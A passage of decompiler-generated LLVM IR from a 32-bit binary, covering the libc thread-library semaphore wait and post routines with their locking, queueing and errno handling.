  %v0_804c10d = load i32, i32* @ebx, align 4
  store i32 %v0_804c10d, i32* %stack_var_-16, align 4
  %v4_804c10d = ptrtoint i32* %stack_var_-16 to i32
  %v2_804c111 = call i32 @thread_self.1(i32 %v0_804c10d, i32 %v0_804c10c)
  store i32 %arg1, i32* @edi, align 4
  store i32 %v2_804c111, i32* @edx, align 4
  store i32 %v2_804c111, i32* @esi, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v0_804c124 = load i32, i32* %stack_var_-16, align 4
  %v1_804c124 = call i32 @__pthread_lock(i32 %v0_804c124)
  %v0_804c129 = load i32, i32* @edi, align 4
  %v1_804c129 = add i32 %v0_804c129, 8
  %v2_804c129 = inttoptr i32 %v1_804c129 to i32*
  %v3_804c129 = load i32, i32* %v2_804c129, align 4
  %tmp20 = icmp slt i32 %v3_804c129, 1
  br i1 %tmp20, label %dec_label_pc_804c141, label %dec_label_pc_804c130

dec_label_pc_804c130:                             ; preds = %entry
  %v1_804c130 = add i32 %v3_804c129, -1
  store i32 %v1_804c130, i32* %v2_804c129, align 4
  %v0_804c137 = load i32, i32* @edi, align 4
  store i32 %v0_804c137, i32* %stack_var_-60, align 4
  %v1_804c138 = inttoptr i32 %v0_804c137 to i32*
  %v2_804c138 = call i32 @__pthread_unlock(i32* %v1_804c138)
  br label %dec_label_pc_804c161

dec_label_pc_804c141:                             ; preds = %entry
  %v0_804c141 = load i32, i32* @ebp, align 4
  %v1_804c141 = add i32 %v0_804c141, 4
  %v2_804c141 = inttoptr i32 %v1_804c141 to i32*
  %v3_804c141 = load i32, i32* %v2_804c141, align 4
  %tmp23 = icmp ult i32 %v3_804c141, 1000000000
  br i1 %tmp23, label %dec_label_pc_804c169, label %dec_label_pc_804c14a

dec_label_pc_804c14a:                             ; preds = %dec_label_pc_804c141
  store i32 %v0_804c129, i32* %stack_var_-60, align 4
  %v1_804c14e = inttoptr i32 %v0_804c129 to i32*
  %v2_804c14e = call i32 @__pthread_unlock(i32* %v1_804c14e)
  %v1_804c153 = call i32 @__errno_location(i32 %v0_804c129)
  %v1_804c158 = inttoptr i32 %v1_804c153 to i32*
  store i32 22, i32* %v1_804c158, align 4
  br label %dec_label_pc_804c161

dec_label_pc_804c161:                             ; preds = %dec_label_pc_804c130, %dec_label_pc_804c14a
  %storemerge = phi i32 [ -1, %dec_label_pc_804c14a ], [ 0, %dec_label_pc_804c130 ]
  br label %dec_label_pc_804c25b

dec_label_pc_804c169:                             ; preds = %dec_label_pc_804c141
  store i32 %v0_804c129, i32* %stack_var_-24, align 4
  %v2_804c175 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804c175, i32* @edx, align 4
  %v0_804c179 = load i32, i32* @esi, align 4
  %v1_804c179 = add i32 %v0_804c179, 442
  %v2_804c179 = inttoptr i32 %v1_804c179 to i8*
  store i8 0, i8* %v2_804c179, align 1
  %v0_804c180 = load i32, i32* @esi, align 4
  store i32 %v0_804c180, i32* @eax, align 4
  %v0_804c182 = load i32, i32* %stack_var_-24, align 4
  %v2_804c182 = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c182, i32 134529217)
  %v0_804c187 = load i32, i32* @esi, align 4
  %v1_804c187 = add i32 %v0_804c187, 66
  %v2_804c187 = inttoptr i32 %v1_804c187 to i8*
  %v3_804c187 = load i8, i8* %v2_804c187, align 1
  %v4_804c187 = icmp eq i8 %v3_804c187, 0
  br i1 %v4_804c187, label %dec_label_pc_804c198, label %dec_label_pc_804c18d

dec_label_pc_804c18d:                             ; preds = %dec_label_pc_804c169
  store i32 1, i32* @ebx, align 4
  %v1_804c192 = add i32 %v0_804c187, 64
  %v2_804c192 = inttoptr i32 %v1_804c192 to i8*
  %v3_804c192 = load i8, i8* %v2_804c192, align 1
  %v4_804c192 = icmp eq i8 %v3_804c192, 0
  br i1 %v4_804c192, label %dec_label_pc_804c1a4, label %dec_label_pc_804c198

dec_label_pc_804c198:                             ; preds = %dec_label_pc_804c18d, %dec_label_pc_804c169
  store i32 %v0_804c187, i32* @edx, align 4
  %v0_804c19d = call i32 @enqueue()
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804c1a4

dec_label_pc_804c1a4:                             ; preds = %dec_label_pc_804c18d, %dec_label_pc_804c198
  %v0_804c1a7 = load i32, i32* @edi, align 4
  store i32 %v0_804c1a7, i32* %stack_var_-60, align 4
  %v1_804c1a8 = inttoptr i32 %v0_804c1a7 to i32*
  %v2_804c1a8 = call i32 @__pthread_unlock(i32* %v1_804c1a8)
  %v0_804c1b0 = load i32, i32* @ebx, align 4
  %v1_804c1b0 = icmp eq i32 %v0_804c1b0, 0
  br i1 %v1_804c1b0, label %dec_label_pc_804c1bf.preheader, label %dec_label_pc_804c1b4

dec_label_pc_804c1bf.preheader:                   ; preds = %dec_label_pc_804c1a4
  %v0_804c1c2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c1bf

dec_label_pc_804c1b4:                             ; preds = %dec_label_pc_804c1a4
  store i32 0, i32* @edx, align 4
  %v0_804c1b6 = load i32, i32* @esi, align 4
  store i32 %v0_804c1b6, i32* @eax, align 4
  %v0_804c1b8 = load i32, i32* %stack_var_-60, align 4
  %v2_804c1b8 = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c1b8, i32 %tmp14)
  br label %dec_label_pc_804c232

dec_label_pc_804c1bf:                             ; preds = %dec_label_pc_804c20d, %dec_label_pc_804c204, %dec_label_pc_804c1bf.preheader
  %v0_804c1c2 = phi i32 [ %v0_804c1c2.pre, %dec_label_pc_804c1bf.preheader ], [ %v0_804c1fb, %dec_label_pc_804c204 ], [ %v0_804c1fb, %dec_label_pc_804c20d ]
  %v0_804c1bf = load i32, i32* @ecx, align 4
  %v0_804c1c1 = load i32, i32* @ebp, align 4
  store i32 %v0_804c1c2, i32* %stack_var_-60, align 4
  %v3_804c1c3 = inttoptr i32 %v0_804c1bf to i32*
  %v4_804c1c3 = call i32 @__pthread_timedsuspend_new(i32 %v0_804c1c2, i32* %v3_804c1c3, i32 %v0_804c1bf)
  %v1_804c1cb = icmp eq i32 %v4_804c1c3, 0
  %v1_804c1cd = icmp eq i1 %v1_804c1cb, false
  br i1 %v1_804c1cd, label %dec_label_pc_804c1fb, label %dec_label_pc_804c1cf

dec_label_pc_804c1cf:                             ; preds = %dec_label_pc_804c1bf
  %v0_804c1cf = load i32, i32* @esi, align 4
  store i32 %v0_804c1cf, i32* @edx, align 4
  %v0_804c1d1 = load i32, i32* @edi, align 4
  store i32 %v0_804c1d1, i32* @eax, align 4
  %v0_804c1d3 = load i32, i32* %stack_var_-60, align 4
  %v1_804c1d3 = call i32 @__pthread_lock(i32 %v0_804c1d3)
  %v0_804c1d8 = load i32, i32* @esi, align 4
  store i32 %v0_804c1d8, i32* @edx, align 4
  %v0_804c1da = load i32, i32* @edi, align 4
  %v1_804c1da = add i32 %v0_804c1da, 12
  store i32 %v1_804c1da, i32* @eax, align 4
  %v0_804c1dd = call i32 @remove_from_queue()
  store i32 %v0_804c1dd, i32* @ebx, align 4
  %v0_804c1e7 = load i32, i32* @edi, align 4
  store i32 %v0_804c1e7, i32* %stack_var_-60, align 4
  %v1_804c1e8 = inttoptr i32 %v0_804c1e7 to i32*
  %v2_804c1e8 = call i32 @__pthread_unlock(i32* %v1_804c1e8)
  %v1_804c1f0 = icmp eq i32 %v0_804c1dd, 0
  %v1_804c1f2 = icmp eq i1 %v1_804c1f0, false
  br i1 %v1_804c1f2, label %dec_label_pc_804c240, label %dec_label_pc_804c1f4

dec_label_pc_804c1f4:                             ; preds = %dec_label_pc_804c1cf
  %v0_804c1f4 = load i32, i32* @esi, align 4
  store i32 %v0_804c1f4, i32* @eax, align 4
  %v0_804c1f6 = call i32 @suspend()
  br label %dec_label_pc_804c1fb

dec_label_pc_804c1fb:                             ; preds = %dec_label_pc_804c1bf, %dec_label_pc_804c1f4
  %v0_804c1fb = load i32, i32* @esi, align 4
  %v1_804c1fb = add i32 %v0_804c1fb, 442
  %v2_804c1fb = inttoptr i32 %v1_804c1fb to i8*
  %v3_804c1fb = load i8, i8* %v2_804c1fb, align 1
  %v4_804c1fb = icmp eq i8 %v3_804c1fb, 0
  %v1_804c202 = icmp eq i1 %v4_804c1fb, false
  br i1 %v1_804c202, label %dec_label_pc_804c213, label %dec_label_pc_804c204

dec_label_pc_804c204:                             ; preds = %dec_label_pc_804c1fb
  %v1_804c204 = add i32 %v0_804c1fb, 440
  %v2_804c204 = inttoptr i32 %v1_804c204 to i8*
  %v3_804c204 = load i8, i8* %v2_804c204, align 1
  %v4_804c204 = icmp eq i8 %v3_804c204, 0
  br i1 %v4_804c204, label %dec_label_pc_804c1bf, label %dec_label_pc_804c20d

dec_label_pc_804c20d:                             ; preds = %dec_label_pc_804c204
  %v1_804c20d = add i32 %v0_804c1fb, 64
  %v2_804c20d = inttoptr i32 %v1_804c20d to i8*
  %v3_804c20d = load i8, i8* %v2_804c20d, align 1
  %v4_804c20d = icmp eq i8 %v3_804c20d, 0
  %v1_804c211 = icmp eq i1 %v4_804c20d, false
  br i1 %v1_804c211, label %dec_label_pc_804c1bf, label %dec_label_pc_804c213

dec_label_pc_804c213:                             ; preds = %dec_label_pc_804c20d, %dec_label_pc_804c1fb
  store i32 0, i32* @edx, align 4
  store i32 %v0_804c1fb, i32* @eax, align 4
  %v0_804c217 = load i32, i32* %stack_var_-60, align 4
  %v2_804c217 = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c217, i32 %v0_804c1c1)
  %v0_804c21c = load i32, i32* @esi, align 4
  %v1_804c21c = add i32 %v0_804c21c, 440
  %v2_804c21c = inttoptr i32 %v1_804c21c to i8*
  %v3_804c21c = load i8, i8* %v2_804c21c, align 1
  %v4_804c21c = icmp eq i8 %v3_804c21c, 0
  br i1 %v4_804c21c, label %dec_label_pc_804c259, label %dec_label_pc_804c225

dec_label_pc_804c225:                             ; preds = %dec_label_pc_804c213
  %v1_804c225 = add i32 %v0_804c21c, 64
  %v2_804c225 = inttoptr i32 %v1_804c225 to i8*
  %v3_804c225 = load i8, i8* %v2_804c225, align 1
  %v4_804c225 = icmp eq i8 %v3_804c225, 0
  %v1_804c229 = icmp eq i1 %v4_804c225, false
  br i1 %v1_804c229, label %dec_label_pc_804c259, label %dec_label_pc_804c22b

dec_label_pc_804c22b:                             ; preds = %dec_label_pc_804c225
  store i8 0, i8* %v2_804c21c, align 1
  br label %dec_label_pc_804c232

dec_label_pc_804c232:                             ; preds = %dec_label_pc_804c1b4, %dec_label_pc_804c22b
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_804c23b = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804c10d)
  br label %dec_label_pc_804c240

dec_label_pc_804c240:                             ; preds = %dec_label_pc_804c1cf, %dec_label_pc_804c232
  %stack_var_-56.0 = phi i32 [ %v4_804c10d, %dec_label_pc_804c232 ], [ %v0_804c1c1, %dec_label_pc_804c1cf ]
  store i32 0, i32* @edx, align 4
  %v0_804c242 = load i32, i32* @esi, align 4
  store i32 %v0_804c242, i32* @eax, align 4
  %v0_804c244 = load i32, i32* %stack_var_-60, align 4
  %v2_804c244 = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c244, i32 %stack_var_-56.0)
  %v1_804c249 = call i32 @__errno_location(i32 %v0_804c244)
  %v1_804c24e = inttoptr i32 %v1_804c249 to i32*
  store i32 110, i32* %v1_804c24e, align 4
  br label %dec_label_pc_804c25b

dec_label_pc_804c259:                             ; preds = %dec_label_pc_804c225, %dec_label_pc_804c213
  br label %dec_label_pc_804c25b

dec_label_pc_804c25b:                             ; preds = %dec_label_pc_804c240, %dec_label_pc_804c161, %dec_label_pc_804c259
  %v0_804c262 = phi i32 [ -1, %dec_label_pc_804c240 ], [ %storemerge, %dec_label_pc_804c161 ], [ 0, %dec_label_pc_804c259 ]
  ret i32 %v0_804c262

; uselistorder directives
  uselistorder i32 %v0_804c1fb, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v0_804c1dd, { 1, 0 }
  uselistorder i32 %v0_804c1c2, { 1, 0 }
  uselistorder i32 %v3_804c129, { 1, 0 }
  uselistorder i32 %v0_804c129, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-60, { 1, 4, 0, 5, 3, 6, 2, 7, 8, 9 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804c25b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c240, { 1, 0 }
  uselistorder label %dec_label_pc_804c232, { 1, 0 }
  uselistorder label %dec_label_pc_804c1fb, { 1, 0 }
  uselistorder label %dec_label_pc_804c1a4, { 1, 0 }
  uselistorder label %dec_label_pc_804c161, { 1, 0 }
}

define i32 @__new_sem_wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804c263 = load i32, i32* @esi, align 4
  %v0_804c264 = load i32, i32* @ebx, align 4
  store i32 %v0_804c264, i32* %stack_var_-8, align 4
  %v4_804c264 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804c268 = call i32 @thread_self.1(i32 %v0_804c264, i32 %v0_804c263)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v2_804c268, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v1_804c287 = call i32 @__pthread_lock(i32 %arg1)
  %v0_804c28c = load i32, i32* @ebx, align 4
  %v1_804c28c = add i32 %v0_804c28c, 8
  %v2_804c28c = inttoptr i32 %v1_804c28c to i32*
  %v3_804c28c = load i32, i32* %v2_804c28c, align 4
  %tmp12 = icmp slt i32 %v3_804c28c, 1
  br i1 %tmp12, label %dec_label_pc_804c2a8, label %dec_label_pc_804c293

dec_label_pc_804c293:                             ; preds = %entry
  %v1_804c296 = add i32 %v3_804c28c, -1
  store i32 %v1_804c296, i32* %v2_804c28c, align 4
  %v0_804c29a = load i32, i32* @ebx, align 4
  store i32 %v0_804c29a, i32* %stack_var_-44, align 4
  %v1_804c29b = inttoptr i32 %v0_804c29a to i32*
  %v2_804c29b = call i32 @__pthread_unlock(i32* %v1_804c29b)
  br label %dec_label_pc_804c36c

dec_label_pc_804c2a8:                             ; preds = %entry
  %v2_804c2ac = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804c2ac, i32* @edx, align 4
  %v1_804c2b0 = add i32 %v2_804c268, 442
  %v2_804c2b0 = inttoptr i32 %v1_804c2b0 to i8*
  store i8 0, i8* %v2_804c2b0, align 1
  store i32 %v2_804c268, i32* @eax, align 4
  %v0_804c2bb = load i32, i32* %stack_var_-44, align 4
  %v2_804c2bb = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c2bb, i32 %tmp8)
  %v1_804c2c4 = add i32 %v2_804c268, 66
  %v2_804c2c4 = inttoptr i32 %v1_804c2c4 to i8*
  %v3_804c2c4 = load i8, i8* %v2_804c2c4, align 1
  %v4_804c2c4 = icmp eq i8 %v3_804c2c4, 0
  br i1 %v4_804c2c4, label %dec_label_pc_804c2d9, label %dec_label_pc_804c2ca

dec_label_pc_804c2ca:                             ; preds = %dec_label_pc_804c2a8
  store i32 1, i32* @esi, align 4
  %v1_804c2d3 = add i32 %v2_804c268, 64
  %v2_804c2d3 = inttoptr i32 %v1_804c2d3 to i8*
  %v3_804c2d3 = load i8, i8* %v2_804c2d3, align 1
  %v4_804c2d3 = icmp eq i8 %v3_804c2d3, 0
  br i1 %v4_804c2d3, label %dec_label_pc_804c2e7, label %dec_label_pc_804c2d9

dec_label_pc_804c2d9:                             ; preds = %dec_label_pc_804c2ca, %dec_label_pc_804c2a8
  store i32 %v2_804c268, i32* @edx, align 4
  %v0_804c2e0 = call i32 @enqueue()
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804c2e7

dec_label_pc_804c2e7:                             ; preds = %dec_label_pc_804c2ca, %dec_label_pc_804c2d9
  %v0_804c2ea = load i32, i32* @ebx, align 4
  store i32 %v0_804c2ea, i32* %stack_var_-44, align 4
  %v1_804c2eb = inttoptr i32 %v0_804c2ea to i32*
  %v2_804c2eb = call i32 @__pthread_unlock(i32* %v1_804c2eb)
  %v0_804c2f3 = load i32, i32* @esi, align 4
  %v1_804c2f3 = icmp eq i32 %v0_804c2f3, 0
  br i1 %v1_804c2f3, label %dec_label_pc_804c304.preheader, label %dec_label_pc_804c2f7

dec_label_pc_804c304.preheader:                   ; preds = %dec_label_pc_804c2e7
  %v1_804c31e = add i32 %v2_804c268, 440
  %v2_804c31e = inttoptr i32 %v1_804c31e to i8*
  %v1_804c32b = add i32 %v2_804c268, 64
  %v2_804c32b = inttoptr i32 %v1_804c32b to i8*
  store i32 %v2_804c268, i32* @eax, align 4
  %v0_804c30813 = call i32 @suspend()
  %v3_804c31114 = load i8, i8* %v2_804c2b0, align 1
  %v4_804c31115 = icmp eq i8 %v3_804c31114, 0
  %v1_804c31816 = icmp eq i1 %v4_804c31115, false
  br i1 %v1_804c31816, label %dec_label_pc_804c331, label %dec_label_pc_804c31a

dec_label_pc_804c2f7:                             ; preds = %dec_label_pc_804c2e7
  store i32 %v2_804c268, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804c2fd = load i32, i32* %stack_var_-44, align 4
  %v2_804c2fd = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c2fd, i32 %tmp8)
  br label %dec_label_pc_804c35e

dec_label_pc_804c31a:                             ; preds = %dec_label_pc_804c304.preheader, %dec_label_pc_804c304.backedge
  %v3_804c31e = load i8, i8* %v2_804c31e, align 1
  %v4_804c31e = icmp eq i8 %v3_804c31e, 0
  br i1 %v4_804c31e, label %dec_label_pc_804c304.backedge, label %dec_label_pc_804c327

dec_label_pc_804c304.backedge:                    ; preds = %dec_label_pc_804c31a, %dec_label_pc_804c327
  store i32 %v2_804c268, i32* @eax, align 4
  %v0_804c308 = call i32 @suspend()
  %v3_804c311 = load i8, i8* %v2_804c2b0, align 1
  %v4_804c311 = icmp eq i8 %v3_804c311, 0
  %v1_804c318 = icmp eq i1 %v4_804c311, false
  br i1 %v1_804c318, label %dec_label_pc_804c331, label %dec_label_pc_804c31a

dec_label_pc_804c327:                             ; preds = %dec_label_pc_804c31a
  %v3_804c32b = load i8, i8* %v2_804c32b, align 1
  %v4_804c32b = icmp eq i8 %v3_804c32b, 0
  %v1_804c32f = icmp eq i1 %v4_804c32b, false
  br i1 %v1_804c32f, label %dec_label_pc_804c304.backedge, label %dec_label_pc_804c331

dec_label_pc_804c331:                             ; preds = %dec_label_pc_804c304.backedge, %dec_label_pc_804c327, %dec_label_pc_804c304.preheader
  store i32 %v2_804c268, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804c337 = load i32, i32* %stack_var_-44, align 4
  %v2_804c337 = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c337, i32 %tmp8)
  %v3_804c340 = load i8, i8* %v2_804c31e, align 1
  %v4_804c340 = icmp eq i8 %v3_804c340, 0
  br i1 %v4_804c340, label %dec_label_pc_804c36c, label %dec_label_pc_804c349

dec_label_pc_804c349:                             ; preds = %dec_label_pc_804c331
  %v3_804c34d = load i8, i8* %v2_804c32b, align 1
  %v4_804c34d = icmp eq i8 %v3_804c34d, 0
  %v1_804c351 = icmp eq i1 %v4_804c34d, false
  br i1 %v1_804c351, label %dec_label_pc_804c36c, label %dec_label_pc_804c353

dec_label_pc_804c353:                             ; preds = %dec_label_pc_804c349
  store i8 0, i8* %v2_804c31e, align 1
  br label %dec_label_pc_804c35e

dec_label_pc_804c35e:                             ; preds = %dec_label_pc_804c2f7, %dec_label_pc_804c353
  store i32 -1, i32* %stack_var_-44, align 4
  %v2_804c367 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804c264)
  br label %dec_label_pc_804c36c

dec_label_pc_804c36c:                             ; preds = %dec_label_pc_804c349, %dec_label_pc_804c331, %dec_label_pc_804c293, %dec_label_pc_804c35e
  ret i32 0

; uselistorder directives
  uselistorder i8* %v2_804c31e, { 1, 0, 2 }
  uselistorder i8* %v2_804c2b0, { 1, 0, 2 }
  uselistorder i32 %v3_804c28c, { 1, 0 }
  uselistorder i32 %v2_804c268, { 5, 6, 2, 0, 3, 4, 7, 1, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 %tmp8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 3, 0, 1, 4, 2, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 ()* @suspend, { 2, 0, 1 }
  uselistorder i32 ()* @enqueue, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804c36c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c35e, { 1, 0 }
  uselistorder label %dec_label_pc_804c331, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c304.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804c31a, { 1, 0 }
  uselistorder label %dec_label_pc_804c2e7, { 1, 0 }
}

define i32 @__new_sem_post() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp13, i32* %stack_var_-188, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c374 = load i32, i32* @esi, align 4
  %v0_804c375 = load i32, i32* @ebx, align 4
  store i32 %v0_804c375, i32* %stack_var_-8, align 4
  %v2_804c37c = call i32 @thread_self.1(i32 %v0_804c375, i32 %v0_804c374)
  store i32 %tmp8, i32* @esi, align 4
  %v1_804c388 = add i32 %v2_804c37c, 84
  %v2_804c388 = inttoptr i32 %v1_804c388 to i32*
  %v3_804c388 = load i32, i32* %v2_804c388, align 4
  %v4_804c388 = icmp eq i32 %v3_804c388, 0
  %v1_804c38c = icmp eq i1 %v4_804c388, false
  br i1 %v1_804c38c, label %dec_label_pc_804c405, label %dec_label_pc_804c38e

dec_label_pc_804c38e:                             ; preds = %entry
  store i32 %v2_804c37c, i32* @edx, align 4
  store i32 %tmp8, i32* @eax, align 4
  %v0_804c392 = load i32, i32* %stack_var_-8, align 4
  %v1_804c392 = call i32 @__pthread_lock(i32 %v0_804c392)
  %v0_804c397 = load i32, i32* @esi, align 4
  %v1_804c397 = add i32 %v0_804c397, 12
  %v2_804c397 = inttoptr i32 %v1_804c397 to i32*
  %v3_804c397 = load i32, i32* %v2_804c397, align 4
  %v4_804c397 = icmp eq i32 %v3_804c397, 0
  %v1_804c39b = icmp eq i1 %v4_804c397, false
  br i1 %v1_804c39b, label %dec_label_pc_804c3eb, label %dec_label_pc_804c39d

dec_label_pc_804c39d:                             ; preds = %dec_label_pc_804c38e
  %v1_804c39d = add i32 %v0_804c397, 8
  %v2_804c39d = inttoptr i32 %v1_804c39d to i32*
  %v3_804c39d = load i32, i32* %v2_804c39d, align 4
  %v9_804c3a0 = icmp eq i32 %v3_804c39d, 2147483647
  %v1_804c3a5 = icmp eq i1 %v9_804c3a0, false
  br i1 %v1_804c3a5, label %dec_label_pc_804c3c0, label %dec_label_pc_804c3a7

dec_label_pc_804c3a7:                             ; preds = %dec_label_pc_804c39d
  %v0_804c3a7 = load i32, i32* %stack_var_-8, align 4
  %v1_804c3a7 = call i32 @__errno_location(i32 %v0_804c3a7)
  %v1_804c3af = inttoptr i32 %v1_804c3a7 to i32*
  store i32 34, i32* %v1_804c3af, align 4
  %v0_804c3b5 = load i32, i32* @esi, align 4
  store i32 %v0_804c3b5, i32* %stack_var_-188, align 4
  %v1_804c3b6 = inttoptr i32 %v0_804c3b5 to i32*
  %v2_804c3b6 = call i32 @__pthread_unlock(i32* %v1_804c3b6)
  br label %dec_label_pc_804c3cf

dec_label_pc_804c3c0:                             ; preds = %dec_label_pc_804c39d
  %v1_804c3c0 = add i32 %v3_804c39d, 1
  store i32 %v1_804c3c0, i32* %v2_804c39d, align 4
  %v0_804c3c7 = load i32, i32* @esi, align 4
  store i32 %v0_804c3c7, i32* %stack_var_-188, align 4
  %v1_804c3c8 = inttoptr i32 %v0_804c3c7 to i32*
  %v2_804c3c8 = call i32 @__pthread_unlock(i32* %v1_804c3c8)
  br label %dec_label_pc_804c3cf

dec_label_pc_804c3cf:                             ; preds = %dec_label_pc_804c3c0, %dec_label_pc_804c3eb, %dec_label_pc_804c3a7
  %storemerge = phi i32 [ -1, %dec_label_pc_804c3a7 ], [ 0, %dec_label_pc_804c3eb ], [ 0, %dec_label_pc_804c3c0 ]
  br label %dec_label_pc_804c45b

dec_label_pc_804c3eb:                             ; preds = %dec_label_pc_804c38e
  store i32 %v3_804c397, i32* @ebx, align 4
  %v1_804c3de = add i32 %v3_804c397, 8
  %v2_804c3de = inttoptr i32 %v1_804c3de to i32*
  %v3_804c3de = load i32, i32* %v2_804c3de, align 4
  store i32 %v3_804c3de, i32* %v2_804c397, align 4
  store i32 0, i32* %v2_804c3de, align 4
  %v0_804c3ee.pre = load i32, i32* @esi, align 4
  store i32 %v0_804c3ee.pre, i32* %stack_var_-188, align 4
  %v1_804c3ef = inttoptr i32 %v0_804c3ee.pre to i32*
  %v2_804c3ef = call i32 @__pthread_unlock(i32* %v1_804c3ef)
  %v1_804c3f4 = add i32 %v3_804c397, 442
  %v2_804c3f4 = inttoptr i32 %v1_804c3f4 to i8*
  store i8 1, i8* %v2_804c3f4, align 1
  store i32 %v3_804c397, i32* %stack_var_-188, align 4
  %v1_804c3fe = call i32 @__pthread_restart_new(i32 %v3_804c397)
  br label %dec_label_pc_804c3cf

dec_label_pc_804c405:                             ; preds = %entry
  %v0_804c405 = load i32, i32* @global_var_80626e4.143, align 4
  %v2_804c405 = icmp slt i32 %v0_804c405, 0
  %v1_804c40c = icmp eq i1 %v2_804c405, false
  br i1 %v1_804c40c, label %dec_label_pc_804c433.preheader, label %dec_label_pc_804c40e

dec_label_pc_804c433.preheader:                   ; preds = %dec_label_pc_804c40e, %dec_label_pc_804c405
  %v2_804c433 = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_804c433

dec_label_pc_804c40e:                             ; preds = %dec_label_pc_804c405
  %v1_804c40e = call i32 @__pthread_initialize_manager(i32 %tmp13)
  %v2_804c413 = icmp slt i32 %v1_804c40e, 0
  %v1_804c415 = icmp eq i1 %v2_804c413, false
  br i1 %v1_804c415, label %dec_label_pc_804c433.preheader, label %dec_label_pc_804c417

dec_label_pc_804c417:                             ; preds = %dec_label_pc_804c40e
  %v0_804c417 = load i32, i32* %stack_var_-188, align 4
  %v1_804c417 = call i32 @__errno_location(i32 %v0_804c417)
  %v1_804c41c = inttoptr i32 %v1_804c417 to i32*
  store i32 11, i32* %v1_804c41c, align 4
  br label %dec_label_pc_804c45b

dec_label_pc_804c433:                             ; preds = %dec_label_pc_804c433.preheader, %dec_label_pc_804c44f
  %v0_804c43e = load i32, i32* @global_var_80626e4.143, align 4
  store i32 %v0_804c43e, i32* %stack_var_-188, align 4
  %v3_804c444 = call i32 @__libc_write(i32 %v0_804c43e, i32 %v2_804c433, i32 148)
  %v8_804c44c = icmp eq i32 %v3_804c444, -1
  %v1_804c44d = icmp eq i1 %v8_804c44c, false
  br i1 %v1_804c44d, label %dec_label_pc_804c459, label %dec_label_pc_804c44f

dec_label_pc_804c44f:                             ; preds = %dec_label_pc_804c433
  %v0_804c44f = load i32, i32* %stack_var_-188, align 4
  %v1_804c44f = call i32 @__errno_location(i32 %v0_804c44f)
  %v1_804c454 = inttoptr i32 %v1_804c44f to i32*
  %v2_804c454 = load i32, i32* %v1_804c454, align 4
  %v11_804c454 = icmp eq i32 %v2_804c454, 4
  br i1 %v11_804c454, label %dec_label_pc_804c433, label %dec_label_pc_804c459

dec_label_pc_804c459:                             ; preds = %dec_label_pc_804c44f, %dec_label_pc_804c433
  br label %dec_label_pc_804c45b

dec_label_pc_804c45b:                             ; preds = %dec_label_pc_804c417, %dec_label_pc_804c3cf, %dec_label_pc_804c459
  %v0_804c463 = phi i32 [ -1, %dec_label_pc_804c417 ], [ %storemerge, %dec_label_pc_804c3cf ], [ 0, %dec_label_pc_804c459 ]
  %v2_804c461 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c461, i32* @ebx, align 4
  store i32 %v0_804c374, i32* @esi, align 4
  ret i32 %v0_804c463

; uselistorder directives
  uselistorder i32 %v3_804c39d, { 1, 0 }
  uselistorder i32 %v3_804c397, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %stack_var_-8, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-188, { 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32, i32)* @thread_self.1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804c45b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c433, { 1, 0 }
  uselistorder label %dec_label_pc_804c3cf, { 1, 0, 2 }
}

define i32 @pthread_null_sighandler() local_unnamed_addr {
entry:
  %v0_804c464 = load i32, i32* @eax, align 4
  ret i32 %v0_804c464
}

define i32 @thread_self.2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804c46c = load i32, i32* @esp, align 4
